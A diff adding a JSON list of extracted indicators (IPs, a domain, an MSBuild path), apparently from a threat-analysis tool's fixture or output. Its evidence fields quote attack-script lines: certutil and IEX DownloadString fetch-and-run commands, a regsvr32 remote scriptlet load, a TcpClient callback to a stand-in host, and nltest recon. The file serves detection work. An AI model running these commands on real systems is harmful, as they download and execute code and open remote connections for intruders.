@@ -1,0 +1,52 @@
+[
+  {
+    "kind": "device",
+    "value": "Microsoft.NET",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261020_101000_step03_exec.ps1:4",
+    "evidence": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)"
+  },
+  {
+    "kind": "device",
+    "value": "corp.example",
+    "origin": "prior",
+    "from": null,
+    "scope": null,
+    "count": 1,
+    "scripts": "20261020_100000_step01_recon.ps1:2",
+    "evidence": "nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)"
+  },
+  {
+    "kind": "ip",
+    "value": "203.0.113.10",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 3,
+    "scripts": "20261020_100500_step02_download.ps1:1, 20261020_101000_step03_exec.ps1:2, 20261020_103000_step07_cleanup.bat:2",
+    "evidence": "certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nregsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\ncertutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)"
+  },
+  {
+    "kind": "ip",
+    "value": "203.0.113.20",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 2,
+    "scripts": "20261020_102000_step05_dotnet.ps1:2, 20261020_102500_step06_pinvoke.ps1:12",
+    "evidence": "$b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nIEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)"
+  },
+  {
+    "kind": "ip",
+    "value": "203.0.113.30",
+    "origin": "prior",
+    "from": null,
+    "scope": "public",
+    "count": 1,
+    "scripts": "20261020_102500_step06_pinvoke.ps1:10",
+    "evidence": "$tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
+  }
+]
